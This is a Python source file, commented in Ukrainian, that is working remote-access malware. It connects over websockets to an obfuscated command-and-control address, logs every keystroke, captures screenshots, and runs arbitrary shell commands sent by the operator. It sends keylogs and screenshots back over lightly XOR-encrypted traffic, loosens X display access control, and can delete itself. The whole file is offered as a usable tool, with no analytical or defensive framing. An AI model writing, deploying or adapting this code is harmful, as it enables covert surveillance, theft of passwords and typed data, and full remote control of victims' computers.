import asyncio
import websockets
import os
import subprocess
import uuid
import base64
import sys
import threading
from io import BytesIO

# Динамічний імпорт для скріншотів
try: from PIL import ImageGrab
except: ImageGrab = None

# Імпорт кейлоггера
try: from pynput import keyboard
except: keyboard = None

_S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv" 
X_KEY = "AMY_2026_SECRET"
log_buffer = []

def get_url(): return base64.b64decode(_S).decode()

def crypt_logic(data: str) -> str:
    key = X_KEY
    return "".join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))

def decrypt(m):
    try:
        decoded = base64.b64decode(m).decode()
        return crypt_logic(decoded)
    except: return None

def encrypt(m):
    res = crypt_logic(m)
    return base64.b64encode(res.encode()).decode()

# --- KEYLOGGER MODULE ---
def on_press(key):
    global log_buffer
    try: k = str(key.char)
    except: k = f" [{str(key)}] "
    log_buffer.append(k)

if keyboard:
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

async def start():
    bot_id = f"bot_{hex(uuid.getnode())[2:10]}"
    if sys.platform != "win32":
        os.environ["DISPLAY"] = ":0"
        try: subprocess.run(["xhost", "+local:root"], capture_output=True)
        except: pass

    while True:
        try:
            async with websockets.connect(get_url() + bot_id) as ws:
                while True:
                    m = await ws.recv()
                    cmd = decrypt(m)
                    if not cmd: continue
                    cmd = cmd.strip()
                    
                    ans = ""
                    if cmd == "self_destruct":
                        my_p = os.path.abspath(sys.argv[0])
                        subprocess.Popen(f"sleep 2 && rm -f {my_p}", shell=True)
                        os._exit(0)
                    
                    elif cmd == "screenshot":
                        if ImageGrab:
                            buf = BytesIO()
                            ImageGrab.grab().save(buf, format="PNG")
                            ans = f"SCREENSHOT:{base64.b64encode(buf.getvalue()).decode()}"
                        else: ans = "Error: Pillow not installed on bot."
                    
                    elif cmd == "get_keys":
                        global log_buffer
                        ans = "KEYLOG:" + "".join(log_buffer)
                        log_buffer = [] # очищаємо після відправки
                    
                    else:
                        # Системна команда
                        try:
                            r = subprocess.run(cmd.replace("shell:",""), shell=True, capture_output=True, text=True)
                            ans = (r.stdout + r.stderr) or "Success."
                        except Exception as e: ans = f"Exec Error: {str(e)}"
                    
                    await ws.send(encrypt(ans))
        except: await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(start())
